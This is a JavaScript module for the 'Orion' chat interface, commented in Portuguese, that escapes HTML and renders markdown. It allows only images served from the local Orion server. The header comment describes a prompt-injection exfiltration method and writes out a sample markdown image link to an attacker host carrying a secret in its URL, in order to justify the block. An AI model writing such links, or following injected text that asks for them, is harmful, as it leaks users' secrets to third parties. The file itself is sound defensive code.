/* ==========================================================================
   ORION — markdown leve e escape de HTML (sem DOM, testável em Node)
   ==========================================================================
   Carregado antes de script.js; no navegador publica `OrionMD` e `_escapar`.
   Regras de segurança:
     1. escapa & < > " ' ANTES de qualquer formatação;
     2. a única imagem renderizada é a gerada pelo próprio Orion
        (http://127.0.0.1:8000/imagens/<arquivo>). Imagem de outro host seria um
        canal de exfiltração: um prompt injection faz o modelo escrever
        ![x](https://atacante/?d=<segredo>) e o navegador busca sozinho a URL.
   ========================================================================== */
(function (raiz) {
    'use strict';

    // `[\w.-]+` = só nome de arquivo: nada de `..`, `/`, `%2e`, query ou fragmento.
    const IMAGEM_DO_ORION = /^http:\/\/(?:127\.0\.0\.1|localhost):8000\/imagens\/[\w-][\w.-]*$/;

    function escapar(s) {
        return String(s).replace(/[&<>"']/g, c =>
            ({ '&': '&amp;', '<': '&lt;', '>': '&gt;', '"': '&quot;', "'": '&#39;' }[c]));
    }

    function imagem(alt, url) {
        // `url` já vem escapado: `&amp;`/`&#39;` fazem o teste falhar, o que é o desejado.
        if (IMAGEM_DO_ORION.test(url)) {
            return `<img src="${url}" alt="${alt}" class="msg-img" loading="lazy">`;
        }
        return `<span class="msg-img-bloqueada">[imagem externa bloqueada${alt ? ': ' + alt : ''}]</span>`;
    }

    /* Blocos de código, código inline, negrito, itálico, listas, títulos e imagens. */
    function markdown(bruto) {
        const partes = String(bruto).split(/```([\s\S]*?)```/g);
        let html = '';
        for (let i = 0; i < partes.length; i++) {
            if (i % 2 === 1) {
                const corpo = partes[i].replace(/^[\w+-]*\n/, '');
                html += `<pre><code>${escapar(corpo.replace(/\n$/, ''))}</code></pre>`;
                continue;
            }
            let seg = escapar(partes[i]);
            seg = seg.replace(/!\[([^\]]*)\]\((https?:\/\/[^\s)]+)\)/g, (_, alt, url) => imagem(alt, url));
            seg = seg.replace(/`([^`\n]+)`/g, '<code>$1</code>');
            seg = seg.replace(/\*\*([^*]+)\*\*/g, '<strong>$1</strong>');
            seg = seg.replace(/(?<![\w*])\*([^*\n]+)\*(?![\w*])/g, '<em>$1</em>');

            const linhas = seg.split('\n');
            let out = '', lista = null, paragrafo = [];
            const fechaPar = () => { if (paragrafo.length) { out += `<p>${paragrafo.join('<br>')}</p>`; paragrafo = []; } };
            const fechaLista = () => { if (lista) { out += `</${lista}>`; lista = null; } };
            for (const linha of linhas) {
                const ul = linha.match(/^\s*[-*•]\s+(.*)/);
                const ol = linha.match(/^\s*\d+[.)]\s+(.*)/);
                const ti = linha.match(/^\s*#{1,6}\s+(.*)/);
                if (ul || ol) {
                    fechaPar();
                    const tipo = ul ? 'ul' : 'ol';
                    if (lista !== tipo) { fechaLista(); out += `<${tipo}>`; lista = tipo; }
                    out += `<li>${(ul || ol)[1]}</li>`;
                } else if (ti) {
                    fechaPar(); fechaLista();
                    out += `<p class="md-h">${ti[1]}</p>`;
                } else if (!linha.trim()) {
                    fechaPar(); fechaLista();
                } else {
                    fechaLista();
                    paragrafo.push(linha);
                }
            }
            fechaPar(); fechaLista();
            html += out;
        }
        return html;
    }

    const api = { escapar, markdown };
    raiz.OrionMD = api;
    raiz._escapar = escapar;
    if (typeof module !== 'undefined' && module.exports) module.exports = api;
})(typeof window !== 'undefined' ? window : globalThis);
